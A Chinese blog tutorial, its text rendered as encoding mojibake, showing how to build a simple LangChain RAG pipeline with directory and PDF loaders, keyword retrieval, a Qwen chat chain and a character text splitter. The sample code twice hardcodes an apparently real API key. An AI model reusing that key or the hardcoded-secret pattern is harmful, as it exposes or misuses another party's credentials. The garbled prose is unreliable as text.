<p>è®¸å¤š LLM åº”ç”¨ç¨‹åºéœ€è¦ç”¨æˆ·ç‰¹å®šæ•°æ®ï¼Œè¿™äº›æ•°æ®ä¸æ˜¯æ¨¡å‹çš„è®­ç»ƒé›†çš„ä¸€éƒ¨åˆ†. å®Œæˆè¿™ä¸€ä»»åŠ¡çš„ä¸»è¦æ–¹æ³•æ˜¯é€šè¿‡æ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRAGï¼‰. åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œæ£€ç´¢å¤–éƒ¨æ•°æ®ï¼Œç„¶ååœ¨ç”Ÿæˆæ­¥éª¤ä¸­å°†å…¶ä¼ é€’ç»™ LLM. LangChain ä¸º RAG åº”ç”¨ç¨‹åºæä¾›äº†æ‰€æœ‰çš„æ„å»ºæ¨¡å—-ä»ç®€å•åˆ°å¤æ‚. æœ¬æ–‡æ¡£éƒ¨åˆ†æ¶µç›–äº†ä¸æ£€ç´¢æ­¥éª¤ç›¸å…³çš„æ‰€æœ‰å†…å®¹ï¼Œä¾‹å¦‚æ•°æ®çš„è·å–. è™½ç„¶å¬èµ·æ¥å¾ˆç®€å•ï¼Œä½†å¯èƒ½æœ‰å¾®å¦™çš„å¤æ‚æ€§. è¿™æ¶µç›–äº†å‡ ä¸ªå…³é”®æ¨¡å—. <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/077bf73b9a194f65b722900c79fc417d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=f1WfxTChL46vKfJHJO4G%2FcwqTaU%3D" alt="" loading="lazy"/></p>
<ul>
<li>æ–‡æ¡£åŠ è½½å™¨</li>
</ul>
<p>ä»è®¸å¤šä¸åŒæ¥æºåŠ è½½æ–‡æ¡£. LangChain æä¾›äº† 100 å¤šç§ä¸åŒçš„æ–‡æ¡£åŠ è½½å™¨ï¼Œå¹¶ä¸ç©ºé—´ä¸­çš„å…¶ä»–ä¸»è¦æä¾›å•†ï¼ˆå¦‚ AirByte å’Œ Unstructuredï¼‰é›†æˆ. æˆ‘ä»¬æä¾›äº†åŠ è½½å„ç§ç±»å‹æ–‡æ¡£ï¼ˆHTMLã€PDFã€ä»£ç ï¼‰çš„é›†æˆï¼Œä»å„ç§ä½ç½®ï¼ˆç§äºº S3 å­˜å‚¨æ¡¶ã€å…¬å…±ç½‘ç«™ï¼‰åŠ è½½.</p>
<p>æˆ‘ä»¬å°±ä½¿ç”¨ md æ–‡æ¡£åŠ è½½å™¨å»æ”¹é€ ä¸€ä¸‹æˆ‘ä»¬çš„ä»£ç ã€‚æå‰åœ¨æœ¬é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª doc æ–‡ä»¶å¤¹ï¼Œç”¨æ¥å­˜æ”¾è¦åŠ è½½çš„ md æ–‡æ¡£ï¼Œå¹¶æ”¾å…¥ä¸€äº› md æ–‡æ¡£ <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0560d3e8366a4f10989437126f76fa7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=RFxqvAY8vY7f3Lncskcl8CXOkT4%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-ini" lang="ini">from langchain_community.document_loaders import DirectoryLoader, TextLoader,
<span class="hljs-comment"># è¿™é‡Œè¿˜ä½¿ç”¨åˆ°äº†ä¸€ä¸ªç›®å½•åŠ è½½å™¨ï¼Œç”¨æ¥æ‰«ææ•´ä¸ªç›®å½•ä¸‹çš„ç‰¹å®šæ–‡æ¡£</span>
<span class="hljs-attr">md_docs</span> = DirectoryLoader(
    <span class="hljs-comment"># æ–‡æ¡£ç›®å½•è·¯å¾„</span>
    "./doc",
    <span class="hljs-comment"># è¦åŠ è½½çš„æ–‡æ¡£ç±»å‹</span>
    <span class="hljs-attr">glob</span>=<span class="hljs-string">"**/*.md"</span>,
    <span class="hljs-comment"># è¦ä½¿ç”¨çš„æ–‡æ¡£åŠ è½½å™¨</span>
    <span class="hljs-attr">loader_cls</span>=TextLoader,
    <span class="hljs-comment"># æ˜¯å¦æ˜¾ç¤ºåŠ è½½è¿›åº¦ï¼Œè¿™é‡Œéœ€è¦å®‰è£…ä¸€ä¸ªpythonçš„è¿›åº¦æ˜¾ç¤ºåº“ï¼ˆtqdmï¼‰,è¿™é‡Œæˆ‘å°±ä¸æ˜¾ç¤ºè¿›åº¦</span>
    <span class="hljs-attr">show_progress</span>=<span class="hljs-literal">False</span>,
    <span class="hljs-comment"># æ˜¯å¦å¯ç”¨å¤šçº¿ç¨‹</span>
    <span class="hljs-attr">use_multithreading</span>=<span class="hljs-literal">True</span>,
    <span class="hljs-comment"># é‡åˆ°é”™è¯¯æ˜¯å¦ä¼šè·³è¿‡ï¼Œå¹¶ç»§ç»­åŠ è½½å‰©ä½™çš„æ–‡æ¡£</span>
    <span class="hljs-attr">silent_errors</span>=<span class="hljs-literal">True</span>
).load()
</code></pre>
<p>å®Œæ•´ä»£ç å¦‚ä¸‹</p>
<pre><code class="hljs language-python" lang="python"> Â  Â  <span class="hljs-comment"># éœ€è¦å®‰è£…ä»¥ä¸‹åº“ï¼š</span>
<span class="hljs-comment"># pip install langchain-community tqdm</span>
â€‹
<span class="hljs-keyword">from</span> langchain_community.chat_models <span class="hljs-keyword">import</span> ChatTongyi
<span class="hljs-keyword">from</span> langchain_core.output_parsers <span class="hljs-keyword">import</span> StrOutputParser Â <span class="hljs-comment"># ä½¿ç”¨å­—ç¬¦ä¸²è§£æå™¨</span>
<span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate
<span class="hljs-keyword">from</span> langchain_community.document_loaders <span class="hljs-keyword">import</span> DirectoryLoader, TextLoader
â€‹
<span class="hljs-comment"># åˆå§‹åŒ– LLM</span>
llm = ChatTongyi(
 Â  Â model=<span class="hljs-string">"qwen-plus"</span>,
 Â  Â api_key=<span class="hljs-string">"sk-3e4b3b0a5513440f80a23349057c653f"</span>, Â <span class="hljs-comment"># é‡è¦ï¼šå®é™…åº”ç”¨ä¸­åº”ä½¿ç”¨ç¯å¢ƒå˜é‡</span>
)
â€‹
<span class="hljs-comment"># å®šä¹‰æç¤ºæ¨¡æ¿ï¼ˆé’ˆå¯¹Javaå¼€å‘ï¼‰</span>
prompt = ChatPromptTemplate.from_messages([
 Â   (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€åèµ„æ·±çš„Javaå·¥ç¨‹å¸ˆï¼Œç²¾é€šSpring Bootå’Œå¾®æœåŠ¡æ¶æ„ã€‚è¯·æ ¹æ®æä¾›çš„Javaä»£ç æ–‡æ¡£ï¼Œå›ç­”ç”¨æˆ·å…³äºJavaç¼–ç¨‹çš„é—®é¢˜ã€‚è¯·ç¡®ä¿å›ç­”å‡†ç¡®ã€ä¸“ä¸šã€‚"</span>),
 Â   (<span class="hljs-string">"human"</span>, <span class="hljs-string">"{text}"</span>)
])
â€‹
<span class="hljs-comment"># æ„å»ºé“¾ï¼ˆä½¿ç”¨å­—ç¬¦ä¸²è§£æå™¨ï¼‰</span>
chain = prompt | llm | StrOutputParser()
â€‹
<span class="hljs-comment"># åŠ è½½æ–‡æ¡£ï¼ˆä»docç›®å½•ä¸‹çš„Markdownæ–‡ä»¶ï¼‰</span>
md_docs = DirectoryLoader(
 Â  Â <span class="hljs-string">"./doc"</span>,
 Â  Â glob=<span class="hljs-string">"**/*.md"</span>,
 Â  Â loader_cls=TextLoader,
 Â  Â show_progress=<span class="hljs-literal">True</span>, Â <span class="hljs-comment"># éœ€è¦å®‰è£…tqdm</span>
 Â  Â use_multithreading=<span class="hljs-literal">True</span>,
 Â  Â silent_errors=<span class="hljs-literal">True</span>
).load()
â€‹
<span class="hljs-built_in">print</span>(<span class="hljs-string">"----------åŠ è½½åˆ°çš„æ–‡æ¡£------------"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å…±åŠ è½½ <span class="hljs-subst">{<span class="hljs-built_in">len</span>(md_docs)}</span> ä¸ªæ–‡æ¡£"</span>)
â€‹
<span class="hljs-comment"># æ‰“å°å‰3ä¸ªæ–‡æ¡£çš„æ‘˜è¦ï¼ˆåªæ‰“å°å†…å®¹çš„å‰100ä¸ªå­—ç¬¦ï¼‰</span>
<span class="hljs-keyword">for</span> i, doc <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(md_docs[:<span class="hljs-number">3</span>]):
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\næ–‡æ¡£ <span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span> æ‘˜è¦:"</span>)
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å†…å®¹: <span class="hljs-subst">{doc.page_content[:<span class="hljs-number">100</span>]}</span><span class="hljs-subst">{<span class="hljs-string">'...'</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(doc.page_content) &gt; <span class="hljs-number">100</span> <span class="hljs-keyword">else</span> <span class="hljs-string">''</span>}</span>"</span>)
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¥æº: <span class="hljs-subst">{doc.metadata[<span class="hljs-string">'source'</span>]}</span>"</span>)
â€‹
</code></pre>
<p>æ§åˆ¶å°è¾“å‡º</p>
<pre><code class="hljs language-markdown" lang="markdown">  ----------åŠ è½½åˆ°çš„æ–‡æ¡£------------
å…±åŠ è½½ 8 ä¸ªæ–‡æ¡£
â€‹
æ–‡æ¡£ 1 æ‘˜è¦:
å†…å®¹: # Java çº¿ç¨‹æ± æœ€ä½³å®è·µ
â€‹
<span class="hljs-section">## åœºæ™¯ä¸ç›®æ ‡</span>
<span class="hljs-bullet">-</span> ç»Ÿä¸€ç®¡ç†çº¿ç¨‹ï¼Œé¿å…é¢‘ç¹åˆ›å»º/é”€æ¯çš„å¼€é”€
<span class="hljs-bullet">-</span> æ§åˆ¶å¹¶å‘åº¦ä¸ä»»åŠ¡æ’é˜Ÿç­–ç•¥ï¼ŒåŒ¹é…ä¸šåŠ¡å³°è°·
â€‹
<span class="hljs-section">## æ ¸å¿ƒå‚æ•°ä¸å«ä¹‰</span>
<span class="hljs-bullet">-</span> æ ¸å¿ƒçº¿ç¨‹æ•° corePoolSiz...
æ¥æº: ../doc/java-thread-pool.md
â€‹
æ–‡æ¡£ 2 æ‘˜è¦:
å†…å®¹: # Java å¹¶å‘ä¸é”
â€‹
<span class="hljs-section">## å¯è§æ€§/æœ‰åºæ€§/åŸå­æ€§</span>
<span class="hljs-bullet">-</span> volatileï¼šä¿è¯å¯è§æ€§ä¸ç¦æ­¢æŒ‡ä»¤é‡æ’ï¼Œä¸ä¿è¯åŸå­æ€§
<span class="hljs-bullet">-</span> synchronizedï¼šå¯é‡å…¥äº’æ–¥ï¼Œå†…ç½®é”ï¼Œè¿›å…¥/é€€å‡ºæœ‰å†…å­˜è¯­ä¹‰
<span class="hljs-bullet">-</span> CAS...
æ¥æº: ../doc/java-concurrency.md
â€‹
æ–‡æ¡£ 3 æ‘˜è¦:
å†…å®¹: # Spring Boot æœ€ä½³å®è·µ
â€‹
<span class="hljs-section">## åˆ†å±‚ä¸è¾¹ç•Œ</span>
<span class="hljs-bullet">-</span> Controllerï¼šæ ¡éªŒ/é‰´æƒ/ç¼–æ’
<span class="hljs-bullet">-</span> Serviceï¼šä¸šåŠ¡è§„åˆ™ä¸äº‹åŠ¡
<span class="hljs-bullet">-</span> Repositoryï¼šæŒä¹…åŒ–ï¼Œç¦æ­¢ä¸šåŠ¡é€»è¾‘
â€‹
<span class="hljs-section">## é…ç½®ä¸...</span>
æ¥æº: ../doc/spring-boot-best-practices.md
100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 8/8 [00:00&lt;00:00, 2462.35it/s]
â€‹
Process finished with exit code 0
</code></pre>
<p>è¿™æ ·æˆ‘ä»¬åœ¨è°ƒç”¨ llm å›ç­” Java å¼€å‘ç›¸å…³çš„é—®é¢˜çš„æ—¶å€™ï¼Œä»–å°±ä¼šæ£€ç´¢æ–‡æ¡£å†…å®¹ï¼Œç»“åˆæ–‡æ¡£ç›¸å…³çš„å†…å®¹è¿›è¡Œå›ç­”</p>
<p>æ¥ç€æˆ‘ä»¬æ¥åœ¨æˆ‘ä»¬çš„æµ‹è¯•ä»£ç ä¸­è®© llm å»æ£€ç´¢æ–‡æ¡£</p>
<pre><code class="hljs language-python" lang="python"> Â <span class="hljs-keyword">from</span> langchain_community.chat_models <span class="hljs-keyword">import</span> ChatTongyi
 Â <span class="hljs-keyword">from</span> langchain_core.output_parsers <span class="hljs-keyword">import</span> StrOutputParser
 Â <span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate
 Â <span class="hljs-keyword">from</span> langchain_community.document_loaders <span class="hljs-keyword">import</span> DirectoryLoader, TextLoader
 Â <span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter
 Â <span class="hljs-keyword">import</span> re
â€‹
 Â <span class="hljs-comment"># åˆå§‹åŒ– LLM</span>
 Â llm = ChatTongyi(
 Â  Â  Â model=<span class="hljs-string">"qwen-plus"</span>,
 Â  Â  Â api_key=<span class="hljs-string">"sk-3e4b3b0a5513440f80a23349057c653f"</span>, Â <span class="hljs-comment"># é‡è¦ï¼šå®é™…åº”ç”¨ä¸­åº”ä½¿ç”¨ç¯å¢ƒå˜é‡</span>
  )
â€‹
 Â <span class="hljs-comment"># æ–‡æ¡£åŠ è½½</span>
 Â md_docs = DirectoryLoader(
 Â  Â  Â <span class="hljs-string">"../doc"</span>,
 Â  Â  Â glob=<span class="hljs-string">"**/*.md"</span>,
 Â  Â  Â loader_cls=TextLoader,
 Â  Â  Â show_progress=<span class="hljs-literal">True</span>,
 Â  Â  Â use_multithreading=<span class="hljs-literal">True</span>,
 Â  Â  Â silent_errors=<span class="hljs-literal">True</span>
  ).load()
â€‹
 Â <span class="hljs-built_in">print</span>(<span class="hljs-string">"----------æ–‡æ¡£åŠ è½½å®Œæˆ------------"</span>)
 Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å…±åŠ è½½ <span class="hljs-subst">{<span class="hljs-built_in">len</span>(md_docs)}</span> ä¸ªæ–‡æ¡£"</span>)
â€‹
 Â <span class="hljs-comment"># ç®€å•çš„æ£€ç´¢å‡½æ•°ï¼ˆåŸºäºå…³é”®è¯åŒ¹é…ï¼‰</span>
 Â <span class="hljs-keyword">def</span> <span class="hljs-title function_">retrieve_documents</span>(<span class="hljs-params">question, documents, k=<span class="hljs-number">3</span></span>):
 Â  Â  Â <span class="hljs-comment"># å°†é—®é¢˜åˆ†è¯ï¼ˆç®€å•æŒ‰ç©ºæ ¼åˆ†å‰²ï¼Œå¿½ç•¥æ ‡ç‚¹ï¼‰</span>
 Â  Â  Â question_words = <span class="hljs-built_in">set</span>(re.findall(<span class="hljs-string">r'\w+'</span>, question.lower()))
â€‹
 Â  Â  Â <span class="hljs-comment"># è®¡ç®—æ¯ä¸ªæ–‡æ¡£çš„å…³é”®è¯åŒ¹é…åº¦</span>
 Â  Â  Â doc_scores = []
 Â  Â  Â <span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> documents:
 Â  Â  Â  Â  Â <span class="hljs-comment"># æ–‡æ¡£å†…å®¹åˆ†è¯</span>
 Â  Â  Â  Â  Â doc_words = re.findall(<span class="hljs-string">r'\w+'</span>, doc.page_content.lower())
 Â  Â  Â  Â  Â <span class="hljs-comment"># è®¡ç®—é—®é¢˜è¯åœ¨æ–‡æ¡£ä¸­å‡ºç°çš„æ¬¡æ•°</span>
 Â  Â  Â  Â  Â common_words = [word <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> question_words <span class="hljs-keyword">if</span> word <span class="hljs-keyword">in</span> doc_words]
 Â  Â  Â  Â  Â score = <span class="hljs-built_in">len</span>(common_words)
 Â  Â  Â  Â  Â doc_scores.append((doc, score))
â€‹
 Â  Â  Â <span class="hljs-comment"># æŒ‰åˆ†æ•°æ’åºï¼ˆé™åºï¼‰</span>
 Â  Â  Â doc_scores.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)
â€‹
 Â  Â  Â <span class="hljs-comment"># è¿”å›kä¸ªæœ€ç›¸å…³çš„æ–‡æ¡£</span>
 Â  Â  Â <span class="hljs-keyword">return</span> [doc <span class="hljs-keyword">for</span> doc, _ <span class="hljs-keyword">in</span> doc_scores[:k]]
â€‹
 Â <span class="hljs-comment"># å®šä¹‰æç¤ºæ¨¡æ¿</span>
 Â prompt = ChatPromptTemplate.from_messages([
 Â  Â   (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€åèµ„æ·±çš„Javaå·¥ç¨‹å¸ˆï¼Œç²¾é€šSpring Bootå’Œå¾®æœåŠ¡æ¶æ„ã€‚è¯·æ ¹æ®æä¾›çš„Javaä»£ç æ–‡æ¡£ï¼Œå›ç­”ç”¨æˆ·å…³äºJavaç¼–ç¨‹çš„é—®é¢˜ã€‚è¯·ç¡®ä¿å›ç­”å‡†ç¡®ã€ä¸“ä¸šï¼Œå¹¶åŒ…å«å¿…è¦çš„ä»£ç ç¤ºä¾‹ã€‚"</span>),
 Â  Â   (<span class="hljs-string">"human"</span>, <span class="hljs-string">"é—®é¢˜: {question}\n\nç›¸å…³æ–‡æ¡£å†…å®¹:\n{context}"</span>)
  ])
â€‹
 Â <span class="hljs-comment"># æ„å»ºé“¾</span>
 Â chain = prompt | llm | StrOutputParser()
â€‹
 Â <span class="hljs-comment"># ç¤ºä¾‹é—®ç­”</span>
 Â <span class="hljs-keyword">def</span> <span class="hljs-title function_">ask_java_question</span>(<span class="hljs-params">question</span>):
 Â  Â  Â <span class="hljs-comment"># æ£€ç´¢ç›¸å…³æ–‡æ¡£</span>
 Â  Â  Â context_docs = retrieve_documents(question, md_docs, k=<span class="hljs-number">3</span>)
â€‹
 Â  Â  Â <span class="hljs-comment"># ç”Ÿæˆä¸Šä¸‹æ–‡å­—ç¬¦ä¸²</span>
 Â  Â  Â context = <span class="hljs-string">"\n\n"</span>.join([doc.page_content <span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> context_docs])
â€‹
 Â  Â  Â <span class="hljs-comment"># ç”Ÿæˆå›ç­”</span>
 Â  Â  Â response = chain.invoke({
 Â  Â  Â  Â  Â <span class="hljs-string">"question"</span>: question,
 Â  Â  Â  Â  Â <span class="hljs-string">"context"</span>: context
 Â  Â   })
â€‹
 Â  Â  Â <span class="hljs-keyword">return</span> response
â€‹
 Â <span class="hljs-comment"># æµ‹è¯•ç¤ºä¾‹</span>
 Â <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n----------ç¤ºä¾‹é—®ç­”----------"</span>)
 Â question = <span class="hljs-string">"è¯´è¯´Java å¹¶å‘ä¸é”"</span>
 Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é—®é¢˜: <span class="hljs-subst">{question}</span>"</span>)
 Â <span class="hljs-built_in">print</span>(<span class="hljs-string">"å›ç­”:"</span>)
 Â <span class="hljs-built_in">print</span>(ask_java_question(question))
 Â <span class="hljs-built_in">print</span>(ask_java_question(question))
</code></pre>
<p>psï¼š å®é™…ä¸Šè¿›è¡ŒçŸ¥è¯†åº“çš„æ£€ç´¢ï¼Œè¿˜æ˜¯è¦å¯¹åŠ è½½åˆ°çš„æ–‡æ¡£è¿›è¡Œåˆ†å‰²ï¼Œå¹¶è¿›è¡Œå‘é‡è½¬åŒ–çš„ï¼Œç„¶åå­˜å‚¨åˆ°å‘é‡æ•°æ®åº“æ ¹æ®ç›¸ä¼¼åº¦è¿›è¡ŒåŒ¹é…ï¼Œæˆ‘ä»¬è¿™é‡Œå°±ç®€å•å®ç°ä¸€ä¸ªæ£€ç´¢å‡½æ•°</p>
<p>æ§åˆ¶å°è¾“å…¥å¦‚ä¸‹</p>
<pre><code class="hljs language-markdown" lang="markdown"> Â  Â  Â   100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 8/8 [00:00&lt;00:00, 2827.78it/s]
 Â  Â   ----------æ–‡æ¡£åŠ è½½å®Œæˆ------------
 Â  Â   å…±åŠ è½½ 8 ä¸ªæ–‡æ¡£
â€‹
 Â  Â   ----------ç¤ºä¾‹é—®ç­”----------
 Â  Â   é—®é¢˜: è¯´è¯´Java å¹¶å‘ä¸é”
 Â  Â   å›ç­”:
 Â  Â   Java å¹¶å‘ç¼–ç¨‹æ˜¯æ„å»ºé«˜æ€§èƒ½ã€é«˜å¯ç”¨æœåŠ¡ç«¯åº”ç”¨çš„æ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€ã€‚ä»¥ä¸‹æ˜¯åŸºäºä½ æä¾›çš„æ–‡æ¡£å†…å®¹ï¼Œå¯¹ <span class="hljs-strong">**Java å¹¶å‘ä¸é”**</span> çš„ç³»ç»Ÿæ€§æ€»ç»“å’Œæ·±å…¥è§£æï¼š
â€‹
 Â  Â   ---
â€‹
 Â  Â   ## ä¸€ã€å¹¶å‘ä¸‰å¤§ç‰¹æ€§ï¼šåŸå­æ€§ã€å¯è§æ€§ã€æœ‰åºæ€§
â€‹
 Â  Â   ### 1. åŸå­æ€§ï¼ˆAtomicityï¼‰
 Â  Â   æŒ‡ä¸€ä¸ªæ“ä½œä¸å¯ä¸­æ–­ï¼Œè¦ä¹ˆå…¨éƒ¨æ‰§è¡ŒæˆåŠŸï¼Œè¦ä¹ˆä¸æ‰§è¡Œã€‚
â€‹
 Â  Â   - âŒ <span class="hljs-code">`volatile`</span> ä¸ä¿è¯åŸå­æ€§
 Â  Â   - âœ… <span class="hljs-code">`synchronized`</span> å’Œ <span class="hljs-code">`ReentrantLock`</span> å¯ä¿è¯åŸå­æ€§
 Â  Â   - âœ… CASï¼ˆCompare-And-Swapï¼‰é…åˆå¾ªç¯å®ç°åŸå­æ›´æ–°ï¼ˆå¦‚ <span class="hljs-code">`AtomicInteger`</span>ï¼‰
  ......................çœç•¥.........................
 Â  Â   ## æ€»ç»“
â€‹
 Â  Â   Java å¹¶å‘ç¼–ç¨‹éœ€è¦ç»¼åˆè€ƒè™‘ <span class="hljs-strong">**æ€§èƒ½ã€å®‰å…¨æ€§ã€å¯ç»´æŠ¤æ€§**</span>ï¼š
â€‹
 Â  Â   - <span class="hljs-strong">**åŸºç¡€å±‚é¢**</span>ï¼šç†è§£åŸå­æ€§ã€å¯è§æ€§ã€æœ‰åºæ€§ï¼Œåˆç†ä½¿ç”¨ <span class="hljs-code">`volatile`</span> å’Œ <span class="hljs-code">`synchronized`</span>
 Â  Â   - <span class="hljs-strong">**è¿›é˜¶å±‚é¢**</span>ï¼šæŒæ¡ <span class="hljs-code">`ReentrantLock`</span>ã€<span class="hljs-code">`ReadWriteLock`</span>ã€<span class="hljs-code">`StampedLock`</span>ã€<span class="hljs-code">`CompletableFuture`</span>
 Â  Â   - <span class="hljs-strong">**é«˜æ€§èƒ½åœºæ™¯**</span>ï¼šé€‰ç”¨ <span class="hljs-code">`LongAdder`</span>ã€<span class="hljs-code">`ConcurrentHashMap`</span> ç­‰æ— é”æˆ–åˆ†æ®µé”ç»“æ„
 Â  Â   - <span class="hljs-strong">**è®¾è®¡å±‚é¢**</span>ï¼šç¼©å°é”èŒƒå›´ã€é¿å…åµŒå¥—ã€ä¸åœ¨é”ä¸­åšè€—æ—¶æ“ä½œ
â€‹
 Â  Â   &gt; ğŸ“Œ æœ€ç»ˆç›®æ ‡ï¼š<span class="hljs-strong">**å°½å¯èƒ½æ— é”åŒ–ï¼Œè¯»å†™åˆ†ç¦»ï¼Œå‡å°‘ç«äº‰ï¼Œæå‡ååé‡**</span>
â€‹
 Â  Â   å¦‚æœä½ æœ‰å…·ä½“çš„å¹¶å‘é—®é¢˜åœºæ™¯ï¼ˆæ¯”å¦‚â€œå¦‚ä½•å®ç°ä¸€ä¸ªçº¿ç¨‹å®‰å…¨çš„ç¼“å­˜ï¼Ÿâ€ï¼‰ï¼Œæ¬¢è¿è¿›ä¸€æ­¥æé—®ï¼
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åœ¨ ai å›å¤çš„å†…å®¹å‘ç°äº†ï¼Œä»–æ ¹æ®äº†å·²ç»æœ‰çš„æ–‡æ¡£è¿›è¡Œå›ç­”ã€‚ å¯¹äºå…¶ä»–çš„ä¸€äº›æ–‡æ¡£åŠ è½½å™¨ï¼Œæ¯”å¦‚ pdf åŠ è½½å™¨ç­‰ç”¨æ³•ä¹Ÿæ˜¯å·®ä¸å¤š</p>
<p>æ¯”å¦‚æˆ‘ä»¬æƒ³ä½¿ç”¨ pdf æ–‡æ¡£åŠ è½½å™¨</p>
<pre><code class="hljs language-ini" lang="ini">  from langchain_community.document_loaders import DirectoryLoader, TextLoader, PyPDFLoader
    <span class="hljs-attr">pdf_docs</span> = DirectoryLoader(
        config.DOC_DIR,
        <span class="hljs-attr">glob</span>=<span class="hljs-string">"**/*.pdf"</span>,
        <span class="hljs-attr">loader_cls</span>=PyPDFLoader,
        <span class="hljs-attr">show_progress</span>=<span class="hljs-literal">True</span>,
        <span class="hljs-attr">use_multithreading</span>=<span class="hljs-literal">True</span>,
        <span class="hljs-attr">silent_errors</span>=<span class="hljs-literal">True</span>
    ).load()
</code></pre>
<ul>
<li>
<p>æ–‡æ¡£è½¬æ¢å™¨</p>
<p>è¿™é‡Œå‘¢å°±å’Œæˆ‘ä»¬åœ¨è®²è§£æ–‡æ¡£åŠ è½½å™¨çš„ä½¿ç”¨æ‰€å¯¹åº”äº†ï¼Œæˆ‘ä»¬åœ¨ä¸Šé¢æåˆ°åŠ è½½åˆ°çš„æ–‡æ¡£éœ€è¦è¿›ä¸€æ­¥è½¬åŒ–ï¼Œå½“æ—¶æˆ‘ä»¬å°±ç¼–å†™äº†ä¸€ä¸ªç®€å•çš„å¤„ç†å‡½æ•°ï¼Œç°åœ¨æˆ‘ä»¬å°±æ¥ä½¿ç”¨çœŸæ­£çš„æ–‡æ¡£è½¬æ¢å™¨</p>
</li>
</ul>
<p>æ£€ç´¢çš„ä¸€ä¸ªå…³é”®éƒ¨åˆ†æ˜¯ä»…è·å–æ–‡æ¡£çš„ç›¸å…³éƒ¨åˆ†. ä¸ºäº†æœ€å¥½åœ°å‡†å¤‡æ–‡æ¡£ä»¥è¿›è¡Œæ£€ç´¢ï¼Œè¿™æ¶‰åŠå‡ ä¸ªè½¬æ¢æ­¥éª¤. å…¶ä¸­ä¸€ä¸ªä¸»è¦æ­¥éª¤æ˜¯å°†å¤§å‹æ–‡æ¡£åˆ†å‰²ï¼ˆæˆ–åˆ†å—ï¼‰ä¸ºè¾ƒå°çš„å—. LangChain æä¾›äº†å‡ ç§ä¸åŒçš„ç®—æ³•æ¥å®Œæˆæ­¤æ“ä½œï¼Œä»¥åŠé’ˆå¯¹ç‰¹å®šæ–‡æ¡£ç±»å‹ï¼ˆä»£ç ã€markdown ç­‰ï¼‰è¿›è¡Œä¼˜åŒ–çš„é€»è¾‘.</p>
<p>é‚£éƒ½æœ‰å‡ ç§æ–‡æ¡£è½¬æ¢å™¨å‘¢ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥é€šè¿‡å®˜æ–¹æ–‡æ¡£çš„å½¢å¼æ¥æŸ¥çœ‹ï¼Œè€Œä¸”å¯ä»¥é€šè¿‡æŸ¥çœ‹æºä»£ç çš„æ–¹å¼ï¼Œä¹‹å‰æˆ‘ä»¬æ‰€è®²çš„å„ç§ langchian ä¸­çš„å·¥å…·ç±»åº“ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹å¼æ¥æŸ¥çœ‹ã€‚ ä»¥ä¸‹æ˜¯æ‰€æœ‰çš„æ–‡æ¡£è½¬æ¢å™¨ï¼Œé€šè¿‡æŸ¥çœ‹<strong>langchain.text_splitter</strong>çš„æºä»£ç æ‰€å¾—</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8163b3c300ce44daa2d4f53f041c3f90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=x%2BMOj2PgA3JF8YzYTIaSzsUxxvI%3D" alt="" loading="lazy"/></p>
<p>é‚£å¯¹äºæˆ‘ä»¬å¼€å‘ä¸€ä¸ªç®€å•çš„ LangChain æ™ºèƒ½ä½“è€Œè¨€ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨æœ€åŸºç¡€çš„<strong>from langchain.text_splitter import CharacterTextSplitter</strong>å­—ç¬¦åˆ†å‰²å™¨</p>
<pre><code class="hljs language-ini" lang="ini">  <span class="hljs-attr">text_splitter</span> = CharacterTextSplitter(separator=<span class="hljs-string">"\n\n"</span>, chunk_size=<span class="hljs-number">500</span>, chunk_overlap=<span class="hljs-number">80</span>, length_function=len)
<span class="hljs-attr">texts</span> = text_splitter.split_documents(all_docs) if all_docs else []
</code></pre>
